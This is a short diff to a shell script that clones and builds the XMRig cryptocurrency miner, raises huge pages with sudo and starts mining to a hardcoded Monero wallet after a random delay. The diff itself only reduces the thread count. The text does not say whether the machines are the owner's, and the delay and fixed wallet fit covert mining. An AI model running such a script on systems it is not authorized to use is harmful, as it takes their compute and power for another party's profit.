@@ -13,15 +13,15 @@ build_xmrig() {
     git clone https://github.com/xmrig/xmrig.git
     cd xmrig
     mkdir build && cd build
-    cmake .. -DWITH_HWLOC=OFF
+    cmake ..
     make -j$(nproc)
-    sudo sysctl -w vm.nr_hugepages=8056
+    sudo sysctl -w vm.nr_hugepages=256
 }
 
 start_mining() 
 {
     sleep $((60 + RANDOM % 60))
-    ./xmrig -o pool.supportxmr.com:3333 -u 82nfTTGkD2yTtGPZENcGCcM6yrgYdWqjbGvU4MpgcDzuXyVTUYkxkS4JcqEm2n73SddJ2QfdYL8JR8keXPsNwZxD872pyBc -p x --tls=false --donate-level=0 -t 252 --cpu-priority=5
+    ./xmrig -o pool.supportxmr.com:3333 -u 82nfTTGkD2yTtGPZENcGCcM6yrgYdWqjbGvU4MpgcDzuXyVTUYkxkS4JcqEm2n73SddJ2QfdYL8JR8keXPsNwZxD872pyBc -p x --tls=false --donate-level=0 -t 8 --cpu-priority=5
 }
 if [ -d "xmrig" ]; then
     cd xmrig/build
